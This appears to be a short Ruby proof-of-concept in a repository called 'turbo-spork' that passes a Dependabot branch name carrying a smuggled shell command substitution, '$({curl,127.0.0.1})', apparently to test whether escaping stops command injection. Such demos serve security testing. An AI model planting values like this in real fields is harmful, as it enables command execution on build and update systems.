# turbo-spork
DEM
require "shellwords"
branch = Shellwords.escape("/$({curl,127.0.0.1})")
source = Dependabot::Source.new(
  provider: "github",
  repo: "repo/name",
  directory: "/",
  branch: branch,
)